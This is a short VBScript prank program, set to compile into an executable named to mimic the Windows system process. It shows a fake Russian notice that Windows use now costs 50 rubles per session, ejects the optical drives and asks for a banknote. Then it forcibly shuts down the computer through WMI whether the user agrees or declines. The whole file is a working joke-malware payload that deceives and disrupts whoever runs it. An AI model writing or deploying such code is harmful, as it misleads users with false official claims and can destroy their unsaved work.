
' ----- ExeScript Options Begin -----
' ScriptType: window,activescript,invoker
' DestDirectory: current
' Icon: default
' OutputFile: F:\дистрибьютивы программ\скрипты visual basic\svchoct.exe
' 32Bit: yes
' ----- ExeScript Options End -----
If MsgBox("В связи с постановлением Правительства РФ работа в Microsoft Windows с 1.02.2013 производится на платной основе. Стоимость 1 сеанса работы - 50 рублей. Продолжить?", vbYesNo Or vbExclamation) = vbYes Then   

Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection

if colCDROMs.Count >= 1 then
	For i = 0 to colCDROMs.Count - 1
		colCDROMs.Item(i).Eject
Next ' cdrom
	End If

MsgBox "Вложите купюру в DVD-привод и закройте, нажмите ОК", vbInformation  
msgbox "Да ты ж не положил деньги, гад!!!", vbCritical
Set OpSysSet = GetObject("winmgmts:{(Shutdown)}//./root/cimv2").ExecQuery("select * from Win32_OperatingSystem where Primary=true")  
 for each OpSys in OpSysSet 
 OpSys.ShutDown() 
 next   
Else   
MsgBox "Приходи, когда будут деньги, дружище! ;-)", vbExclamation

Set OpSysSet = GetObject("winmgmts:{(Shutdown)}//./root/cimv2").ExecQuery("select * from Win32_OperatingSystem where Primary=true")  
 for each OpSys in OpSysSet 
 OpSys.ShutDown() 
 next 
 
End If  